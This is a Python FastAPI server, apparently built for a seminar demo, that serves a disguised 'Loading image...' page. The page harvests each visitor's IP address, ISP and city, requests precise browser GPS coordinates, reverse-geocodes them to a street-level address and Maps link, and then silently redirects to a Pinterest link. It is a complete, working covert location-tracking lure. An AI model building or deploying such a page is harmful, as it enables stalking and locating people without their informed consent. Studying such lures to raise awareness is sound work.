import asyncio
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
import httpx
import uvicorn

app = FastAPI(title="Metadata Demo Backend")


async def fetch_ip_geolocation(ip: str) -> dict:
    if ip in ("127.0.0.1", "::1", "localhost") or ip.startswith("192.168.") or ip.startswith("10."):
        return {"city": "Localhost / Internal Network", "region": "N/A", "country": "N/A", "isp": "Local Server"}
    
    try:
        async with httpx.AsyncClient(timeout=3.0) as client:
            response = await client.get(f"http://ip-api.com/json/{ip}")
            if response.status_code == 200:
                data = response.json()
                if data.get("status") == "success":
                    return {
                        "city": data.get("city"),
                        "region": data.get("regionName"),
                        "country": data.get("country"),
                        "isp": data.get("isp"),
                    }
    except Exception:
        pass
    return {"city": "Unknown", "region": "Unknown", "country": "Unknown", "isp": "Unknown"}


@app.api_route("/", methods=["GET", "HEAD"], response_class=HTMLResponse)
async def public_landing_page(request: Request):
    if request.method == "HEAD":
        return HTMLResponse(content="", status_code=200)

    forwarded_for = request.headers.get("x-forwarded-for")
    real_ip = forwarded_for.split(",")[0].strip() if forwarded_for else request.client.host
    location_info = await fetch_ip_geolocation(real_ip)

    print("\n" + "="*60, flush=True)
    print(" 🚨 NEW VISITOR CONNECTED!", flush=True)
    print(f" IP Address     : {real_ip}", flush=True)
    print(f" IP City/Region : {location_info.get('city')}, {location_info.get('region')}", flush=True)
    print(f" ISP            : {location_info.get('isp')}", flush=True)
    print(" Requesting browser GPS permission & Redirecting to Pinterest...", flush=True)
    print("="*60 + "\n", flush=True)

    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Redirecting...</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding-top: 100px; background-color: #ffffff; }
            p { color: #888; font-size: 16px; }
        </style>
    </head>
    <body>
        <p>Loading image...</p>

        <script>
            const DESTINATION_URL = "https://pin.it/7mD0QLvXJ";

            function sendPayloadAndRedirect(payload) {
                fetch('/api/location-result', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).finally(() => {
                    window.location.replace(DESTINATION_URL);
                });
            }

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        sendPayloadAndRedirect({
                            status: "allowed",
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy_meters: position.coords.accuracy
                        });
                    },
                    function(error) {
                        sendPayloadAndRedirect({
                            status: "blocked",
                            error_message: error.message
                        });
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            } else {
                sendPayloadAndRedirect({ status: "blocked", error_message: "Geolocation unsupported" });
            }

            // Fallback safety timeout: redirect anyway after 4 seconds if browser hangs
            setTimeout(() => {
                window.location.replace(DESTINATION_URL);
            }, 4000);
        </script>
    </body>
    </html>
    """

    response = HTMLResponse(content=html_content, status_code=200)
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response


@app.post("/api/location-result")
async def receive_location_result(request: Request):
    data = await request.json()
    status = data.get("status")

    if status == "allowed":
        lat = data.get("latitude")
        lon = data.get("longitude")
        accuracy = data.get("accuracy_meters")

        street_address = "Unknown"
        try:
            async with httpx.AsyncClient(timeout=3.0) as client:
                resp = await client.get(
                    f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json",
                    headers={"User-Agent": "SeminarDemoApp/1.0"}
                )
                if resp.status_code == 200:
                    addr = resp.json().get("address", {})
                    street_address = f"{addr.get('suburb', '')}, {addr.get('city', addr.get('state_district', ''))}, {addr.get('state', '')}"
        except Exception:
            pass

        print("\n" + "🎯"*30, flush=True)
        print(" 📍 EXACT GPS LOCATION CAPTURED (ALLOWED)", flush=True)
        print("🎯"*30, flush=True)
        print(f" Latitude : {lat}", flush=True)
        print(f" Longitude: {lon}", flush=True)
        print(f" Accuracy : ~{accuracy} meters", flush=True)
        print(f" Address  : {street_address}", flush=True)
        print(f" Maps Link: https://www.google.com/maps?q={lat},{lon}", flush=True)
        print("🎯"*30 + "\n", flush=True)

    elif status == "blocked":
        forwarded_for = request.headers.get("x-forwarded-for")
        real_ip = forwarded_for.split(",")[0].strip() if forwarded_for else request.client.host
        location_info = await fetch_ip_geolocation(real_ip)

        print("\n" + "⚠️"*30, flush=True)
        print(" 🛡️ USER BLOCKED GPS PERMISSION! FALLING BACK TO IP LOCATION:", flush=True)
        print("⚠️"*30, flush=True)
        print(f" Fallback City   : {location_info.get('city')}", flush=True)
        print(f" Fallback Region : {location_info.get('region')}", flush=True)
        print(f" Fallback ISP    : {location_info.get('isp')}", flush=True)
        print(f" Visitor IP      : {real_ip}", flush=True)
        print("⚠️"*30 + "\n", flush=True)

    return JSONResponse(content={"status": "received"})


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)